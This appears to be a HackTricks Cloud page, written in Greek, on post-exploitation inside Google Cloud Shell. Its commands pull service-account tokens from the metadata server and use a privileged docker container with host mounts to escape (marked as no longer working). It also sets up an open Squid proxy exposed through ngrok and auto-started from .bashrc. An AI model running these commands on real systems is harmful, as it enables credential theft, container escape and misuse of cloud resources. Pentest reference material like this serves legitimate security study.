# GCP - Cloud Shell Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell

Για περισσότερες πληροφορίες σχετικά με το Cloud Shell δείτε:

{{#ref}}
../gcp-services/gcp-cloud-shell-enum.md
{{#endref}}

### Λήψη token χρήστη από το metadata

Απλά προσπελάζοντας τον metadata server μπορείτε να αποκτήσετε ένα token για πρόσβαση ως ο τρέχων συνδεδεμένος χρήστης:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
```
### Container Escape / Docker use

> [!WARNING]
> Προηγουμένως το cloud shell εκτελούνταν σε container με πρόσβαση στο docker socket του host. Τώρα η Google έχει αλλάξει την αρχιτεκτονική και το cloud shell container τρέχει σε μια διάταξη "Docker in a container". Έτσι, ακόμα κι αν είναι δυνατή η χρήση του docker από το cloud shell, δεν θα μπορείτε να διαφύγετε στο host χρησιμοποιώντας το docker socket.
> Σημειώστε ότι προηγουμένως το `docker.sock` αρχείο βρισκόταν στο `/google/host/var/run/docker.sock` αλλά τώρα έχει μετακινηθεί στο `/run/docker.sock`.

<details>

<summary>Docker use / Old container escape commands</summary>
```bash
sudo docker -H unix:///run/docker.sock pull alpine:latest
sudo docker -H unix:///run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///run/docker.sock start escaper
sudo docker -H unix:///run/docker.sock exec -it escaper /bin/sh
```
</details>

Επιπλέον, στο παρελθόν ήταν δυνατό να βρεθεί ένα token για ένα service account που χρησιμοποιούσε το cloud shell VM στον metadata server:

<details>

<summary>Παλιό service account από το metadata</summary>
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
Με τα παρακάτω scopes:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
</details>



### Χρησιμοποιήστε το ως Proxy

Εάν θέλετε να χρησιμοποιήσετε το google cloud shell instance ως proxy, πρέπει να εκτελέσετε τις ακόλουθες εντολές (ή να τις εισαγάγετε στο αρχείο .bashrc):

<details>

<summary>Εγκαταστήστε το Squid proxy</summary>
```bash
sudo apt install -y squid
```
</details>

Για την ενημέρωσή σου, ο Squid είναι ένας http proxy server. Δημιούργησε ένα **squid.conf** αρχείο με τις ακόλουθες ρυθμίσεις:

<details>

<summary>Create squid.conf file</summary>
```bash
http_port 3128
cache_dir /var/cache/squid 100 16 256
acl all src 0.0.0.0/0
http_access allow all
```
</details>

αντέγραψε το αρχείο **squid.conf** στο **/etc/squid**

<details>

<summary>Αντέγραψε το config στο /etc/squid</summary>
```bash
sudo cp squid.conf /etc/squid
```
</details>

Τέλος, εκτελέστε την υπηρεσία squid:

<details>

<summary>Έναρξη υπηρεσίας squid</summary>
```bash
sudo service squid start
```
</details>

Χρησιμοποιήστε ngrok για να κάνετε το proxy διαθέσιμο από έξω:

<details>

<summary>Κάντε το proxy διαθέσιμο με ngrok</summary>
```bash
./ngrok tcp 3128
```
</details>

Αφού το τρέξετε, αντιγράψτε το tcp:// url. Αν θέλετε να τρέξετε τον proxy από ένα browser, προτείνεται να αφαιρέσετε το tcp:// μέρος και το port και να βάλετε το port στο πεδίο port στις ρυθμίσεις proxy του browser σας (squid είναι ένας http proxy server).

Για καλύτερη χρήση κατά την εκκίνηση, το αρχείο .bashrc θα πρέπει να έχει τις ακόλουθες γραμμές:

<details>

<summary>Προσθέστε στο .bashrc για αυτόματη εκκίνηση</summary>
```bash
sudo apt install -y squid
sudo cp squid.conf /etc/squid/
sudo service squid start
cd ngrok;./ngrok tcp 3128
```
</details>

Οι οδηγίες αντιγράφηκαν από [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key). Δείτε εκείνη τη σελίδα για άλλες τρελές ιδέες για να τρέξετε οποιονδήποτε τύπο λογισμικού (databases and even windows) στο Cloud Shell.

{{#include ../../../banners/hacktricks-training.md}}
